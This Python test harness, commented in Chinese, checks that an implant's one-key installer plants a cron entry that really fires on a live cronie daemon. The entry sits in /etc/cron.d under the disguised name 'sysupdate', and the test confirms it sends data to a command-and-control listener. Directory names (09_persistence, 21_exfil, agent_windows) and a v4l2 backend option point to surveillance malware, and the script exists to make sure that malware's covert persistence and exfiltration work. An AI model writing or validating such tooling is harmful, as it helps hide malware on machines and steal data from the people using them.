#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
R3 红线：cron 条目**真的会被执行**（真 cron 守护进程 + 真 install + 真分钟触发）。

要证的事
--------
onekey.sh 的 persist_cron 只做两件事：写条目、探测守护进程是否在跑。
探测不到时它只是 WARN，install 照样退出 0、照样报"cron 条目已写入（分位 N）"。
于是"写了但永远不会执行"与"驻留成功"在部署报告里**长得一模一样** ——
这是本红线存在的全部理由。

以前为什么验不了
----------------
* 环境里没有 cron / crond / busybox，apt 无外网装不上；
* 我一度据此判定"真 cron 不可得"，改用自实现的调度器（21_exfil/tests/
  crond_harness.py）代替。但那验的是**我自己写的解析器**，不是真 cron 的
  行为 —— 用它出的证据支撑不了"真机上会被执行"。

本轮查到的真因（两条，都是实测）
--------------------------------
1. 环境里其实跑着一个 vixie cron（/tmp/cronsrc/cron-master/cron）。但它源码
   的 pathnames.h **只有 CRON_DENY、没有 CRON_DIR**，压根不扫描 /etc/cron.d。
   实测：/etc/cron.d/zzprobe 种下后从未触发，而 /etc/crontab 的条目每分钟
   都在跑（status=0000）。即：**选型错误，不是产品缺陷**。若照此下结论，
   会把产品判成"cron 驻留无效"。
2. cronie（RHEL/Fedora 标准实现）的 structs.h 明确以 /etc/cron.d/ 为一等
   配置项。本环境无 autoconf/automake/libtool，故由 scripts/build_cronie.sh
   手工补 config.h 编译（取舍与踩坑见该脚本注释）。

判据
----
  S0 crond 为真 cronie（版本号可查）且以守护进程方式存活
  S1 install 写出 /etc/cron.d/<NAME>，含 user 字段与 run.sh 路径
  S2 等到**真实分钟触发**后，C2 **新增**字节（install 试运行字节已计入基线）
  S3 crond 日志出现该命令的 CMD 行
  R1 反向：把条目退回缺陷写法（去掉 user 字段）→ C2 不再新增、日志不再出现
     该命令 —— 证明 S2/S3 不是恒绿

为什么必须对齐时刻后再 install
------------------------------
条目分位 M = 安装时刻的秒数，语义是 "M * * * *"，即**每小时的第 M 分钟**。
任意时刻安装，最长要等 59 分钟。故按实测耗时把 install 的启动时刻对齐到
"秒 == ((当前分 + 1) % 60 - T) % 60"，使 persist_cron 读到的秒恰为下一分钟
的分值，把等待压到 60 秒内。不改条目、不改调度语义，只挑安装时机。
"""

import hashlib
import os
import re
import shutil
import socket
import subprocess
import sys
import threading
import time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
BUILD = "/var/tmp/r3build"
CRONDIR = "/var/tmp/cronsrc"
NAME = "sysupdate"


def _marker_impl():
    """marker 从 persist.c 派生。硬编码 managed-<NAME> 与实现里的
    "# do-not-edit:managed" 不符，会让 C1 残留检查永远匹配不到：
    卸载没清干净也会报"无残留"，失效且静默。"""
    try:
        body = open(os.path.join(REPO, "09_persistence", "src", "persist.c"),
                    encoding="utf-8", errors="ignore").read()
    except OSError:
        return None
    m = re.search(r'#define\s+MARKER\s+"([^"]*)"', body)
    return m.group(1) if m else None


MARKER = _marker_impl()
if MARKER is None:
    sys.exit("[FATAL] 无法从 persist.c 派生 MARKER")
CRON = "/etc/cron.d/%s" % NAME

results = []
log = []


def rec(ok, name, detail=""):
    results.append((bool(ok), name, detail))
    line = "[%s] %s  %s" % ("OK" if ok else "FAIL", name, detail)
    print(line, flush=True)
    log.append(line)


def note(s):
    print("    ---- %s ----" % s, flush=True)
    log.append("    ---- %s ----" % s)


class Sink(threading.Thread):
    """C2 收端：同一进程内的线程，避免后台进程挂死调用方（老毛病）。"""

    def __init__(self):
        threading.Thread.__init__(self)
        self.daemon = True
        self.srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.srv.bind(("127.0.0.1", 0))
        self.srv.listen(8)
        self.port = self.srv.getsockname()[1]
        self.bytes = 0
        self.conns = 0
        self._stop = False

    def run(self):
        while not self._stop:
            try:
                c, _ = self.srv.accept()
            except OSError:
                return
            self.conns += 1
            while True:
                try:
                    b = c.recv(65536)
                except OSError:
                    break
                if not b:
                    break
                self.bytes += len(b)
            try:
                c.close()
            except OSError:
                pass

    def stop(self):
        self._stop = True
        try:
            self.srv.close()
        except OSError:
            pass


def clean_env():
    """真根部署：显式去掉回归标记。

    该标记会让 onekey.sh 在 root 且未指定 --prefix 时自动切假根（防真实根
    污染的前置拦截）。而 cron 只读真实 /etc/cron.d —— 一旦被切成假根，
    "cron 执行"这条链就根本不会走，守卫会得到一个假的绿。
    """
    e = dict(os.environ)
    e.pop("DAYNANJING_REGRESSION", None)
    e.pop("PREFIX", None)
    return e


def sh(cmd, env=None, timeout=180):
    p = subprocess.run(cmd, shell=True, cwd=REPO, env=env or clean_env(),
                       capture_output=True, text=True, timeout=timeout)
    return p.returncode, p.stdout + p.stderr


def wait_until_second(target):
    """等到达成 秒 == target 的时刻（至多 65 秒）。"""
    deadline = time.time() + 65
    while time.time() < deadline:
        if time.localtime().tm_sec == target:
            return True
        time.sleep(0.2)
    return False


def seconds_until_minute(m):
    now = time.time()
    lt = time.localtime(now)
    cur = lt.tm_min
    delta = (m - cur) % 60
    if delta == 0:
        delta = 60
    return delta * 60 - lt.tm_sec


def main():
    os.makedirs(BUILD, exist_ok=True)

    # ---- 0. 真 cron ----
    rc, out = sh("sh scripts/build_cronie.sh %s" % CRONDIR)
    rec(rc == 0, "S0a 真 cron（cronie）构建成功", out.strip().splitlines()[-1] if out.strip() else "")
    crond = os.path.join(CRONDIR, "crond")
    if not os.path.isfile(crond):
        rec(False, "S0a crond 不存在", crond)
        return 1
    rc, out = sh("%s -V" % crond)
    rec("cronie" in out, "S0b 版本可查", out.strip())

    # ---- 1. 生成一键脚本（不写进仓库，避免生成物污染）----
    camd = os.path.join(REPO, "agent_windows/build/linux/camd")
    if not os.path.isfile(camd):
        sh("make -C agent_windows build/linux/camd", timeout=600)
    if not os.path.isfile(camd):
        rec(False, "S1a camd 二进制缺失", camd)
        return 1
    ok_sh = os.path.join(BUILD, "ok.sh")
    rc, out = sh("python3 21_exfil/make_onekey.py amd64=%s -o %s" % (camd, ok_sh))
    rec(rc == 0 and os.path.getsize(ok_sh) > 1000,
        "S1a 一键脚本已生成", "%d 字节" % os.path.getsize(ok_sh))

    # ---- 2. 清场 ----
    subprocess.run("pkill -x cron; pkill -x crond", shell=True, capture_output=True)
    sh("sh %s uninstall" % ok_sh)
    for junk in ("zzprobe", "probe_d"):
        try:
            os.remove("/etc/cron.d/%s" % junk)
        except OSError:
            pass
    os.makedirs("/var/spool/cron", exist_ok=True)

    # ---- 3. 起真 crond ----
    # 【判据修正 —— /tmp 会被环境清理，日志落盘即 S3 恒红、R2 恒绿】
    # 此前 logf 写在 /tmp/r3_crond.log。环境（502 事件）会清空 /tmp，
    # 于是 CMD 日志行随文件一起消失：S3 报「无」而 R2「无」也通过——
    # R2 因此退化成恒绿假通过。日志必须写在持久目录。
    os.makedirs("/data/workspace/runlog", exist_ok=True)
    logf = "/data/workspace/runlog/r3_crond.log"
    fl = open(logf, "wb")
    pd = subprocess.Popen([crond, "-n", "-x", "sch,proc,pars,load"],
                          stdout=fl, stderr=subprocess.STDOUT,
                          stdin=subprocess.DEVNULL, start_new_session=True)
    time.sleep(2)
    alive = pd.poll() is None
    rec(alive, "S0c crond 以守护进程方式存活", "pid=%d" % pd.pid)
    if not alive:
        return 1

    sink = Sink()
    sink.start()
    rec(True, "S2a C2 收端已起", "port=%d" % sink.port)

    # ---- 4. 对齐 + install ----
    t_est = 4
    installed = False
    wait_sec = None
    for attempt in range(1, 4):
        lt = time.localtime()
        target = ((lt.tm_min + 1) % 60 - t_est) % 60
        wait_until_second(target)
        # /tmp 会被环境周期性清空（本会话撞过多次）。对齐最多要等 65 秒，
        # 期间生成物可能消失；届时 install 报 "cannot open ... No such file"
        # 而排查方向会被引向脚本本身。故此处重新确认并在缺失时再生成一次。
        if not os.path.isfile(ok_sh):
            sh("python3 21_exfil/make_onekey.py amd64=%s -o %s" % (camd, ok_sh))
        if not os.path.isfile(ok_sh):
            rec(False, "S1a 生成物在等待期间丢失且无法重建", ok_sh)
            return 1
        s0 = time.localtime().tm_sec
        rc, out = sh("sh %s install --c2 127.0.0.1:%d --backend v4l2"
                     % (ok_sh, sink.port), timeout=300)
        note("install 输出（第 %d 次）" % attempt)
        for ln in out.splitlines():
            log.append("    " + ln)
            print("    " + ln, flush=True)
        if not os.path.isfile(CRON):
            rec(False, "S1b 条目未写入", CRON)
            return 1
        body = open(CRON).read()
        m = re.search(r"^(\d+)\s+\*\s+\*\s+\*\s+\*\s+(\S+)\s+(\S+)", body, re.M)
        if not m:
            rec(False, "S1b 条目无 user 字段", body.strip())
            return 1
        M = int(m.group(1))
        t_est = (M - s0) % 60
        wait_sec = seconds_until_minute(M)
        note("条目分位 M=%d，距下次触发 %d 秒" % (M, wait_sec))
        if wait_sec <= 150:
            installed = True
            break
        sh("sh %s uninstall" % ok_sh)
    if not installed:
        rec(False, "S1b 三次尝试都没能把等待压到 150 秒内", "")
        return 1

    rec(rc == 0, "S1c install 退出 0", "rc=%d" % rc)
    rec("root" in body and "run.sh" in body,
        "S1d 条目含 user 字段与 run.sh", body.strip().replace("\n", " | "))

    # ---- 5. 等真实触发 ----
    base = sink.bytes
    note("触发前 C2 基线 %d 字节（install 试运行已计入）" % base)
    deadline = time.time() + wait_sec + 100
    fired = False
    while time.time() < deadline:
        if sink.bytes > base:
            fired = True
            break
        time.sleep(1)
    rec(fired, "S2 真实分钟触发后 C2 新增字节",
        "%d -> %d（+%d）连接数=%d" % (base, sink.bytes, sink.bytes - base, sink.conns))
    if not fired:
        sink.stop()
        pd.terminate()
        return 1

    time.sleep(1)
    cl = open(logf, "r", errors="replace").read()
    cmd_lines = [l for l in cl.splitlines() if "CMD (" in l and "run.sh" in l]
    rec(bool(cmd_lines), "S3 crond 日志记录了该命令",
        cmd_lines[-1].strip() if cmd_lines else "无")

    # 日志通道必须可用，否则 R2（反向「无日志行」）会退化成恒绿假通过
    log_ok = "cron started" in cl
    rec(log_ok, "S3b crond 日志通道可用（否则 R2 反向判据无效）",
        "cron started 行存在" if log_ok else "日志为空，判据不可用")

    # ---- 6. 反向：退回缺陷写法（去掉 user 字段）----
    note("反向注入：去掉 user 字段（真 cron.d 契约违反）")
    broken = body.replace(" root ", " ", 1)
    open(CRON, "w").write(broken)
    os.chmod(CRON, 0o600)
    # 【判据修正 —— 删文件重建会让 crond 继续写已删除 inode，新文件恒空 → R2 恒绿】
    # crond 持有的是原 fd；os.remove + 重建同名文件不会改变它的写入目标。
    # 因此反向阶段必须按「字节偏移量截取增量」，而不是靠清空文件隔离。
    pos2 = os.path.getsize(logf)
    base2 = sink.bytes
    w2 = seconds_until_minute(M)
    time.sleep(min(w2 + 20, 120))
    rec(sink.bytes == base2, "R1 缺陷条目：C2 不再新增字节",
        "%d -> %d" % (base2, sink.bytes))
    with open(logf, "r", errors="replace") as fh:
        fh.seek(pos2)
        cl2 = fh.read()
    ran = [l for l in cl2.splitlines() if "CMD (" in l and "run.sh" in l]
    if not log_ok:
        rec(False, "R2 缺陷条目：crond 日志不再出现该命令",
            "日志通道不可用，无法判定（不得记为通过）")
    elif len(cl2.strip()) == 0:
        rec(False, "R2 缺陷条目：crond 日志不再出现该命令",
            "日志增量为 0 字节，未采集到数据（不得记为通过）")
    else:
        rec(not ran, "R2 缺陷条目：crond 日志不再出现该命令",
            ran[-1].strip() if ran else "无（增量 %d 字节内无 CMD 行）" % len(cl2))

    # ---- 7. 清理 ----
    rc_u, out_u = sh("sh %s uninstall" % ok_sh)
    note("uninstall rc=%d" % rc_u)
    for ln in out_u.splitlines():
        note("  | " + ln)
    left = [p for p in ("/etc/%s" % NAME, "/usr/local/bin/%s" % NAME,
                        "/var/lib/%s" % NAME, CRON,
                        "/etc/systemd/system/%s.service" % NAME,
                        "/etc/crontab") if os.path.exists(p)]
    still = []
    if os.path.isfile("/etc/crontab"):
        if MARKER in open("/etc/crontab").read():
            still.append("/etc/crontab(含 %s)" % MARKER)
    left = [p for p in left if p != "/etc/crontab"] + still
    rec(not left, "C1 卸载后真根无残留", ",".join(left) if left else "无")

    pd.terminate()
    sink.stop()
    try:
        shutil.rmtree(BUILD)
    except OSError:
        pass

    # ---- 8. 证据 ----
    npass = sum(1 for r in results if r[0])
    nfail = sum(1 for r in results if not r[0])
    ev = ["=== R3 cron 条目真的会被执行（可重生成）===", ""]
    ev += log
    ev += ["", "计数: PASS %d  FAIL %d" % (npass, nfail)]
    sys.path.insert(0, os.path.join(REPO, "redline"))
    import redline_check as RC
    for rel in next(x for x in RC.REDLINES if x["id"] == "R3").get("sources", []):
        fp = os.path.join(REPO, rel)
        if os.path.isfile(fp):
            raw = open(fp, "rb").read()
            ev.append("SRC %s %s %d" % (rel, hashlib.sha256(raw).hexdigest(), len(raw)))
    os.makedirs(os.path.join(REPO, "redline/evidence"), exist_ok=True)
    ep = os.path.join(REPO, "redline/evidence/R3.evidence")
    open(ep, "w").write("\n".join(ev) + "\n")
    print("\n证据: %s\nPASS=%d FAIL=%d" % (ep, npass, nfail), flush=True)
    return 0 if nfail == 0 else 1


if __name__ == "__main__":
    sys.exit(main())
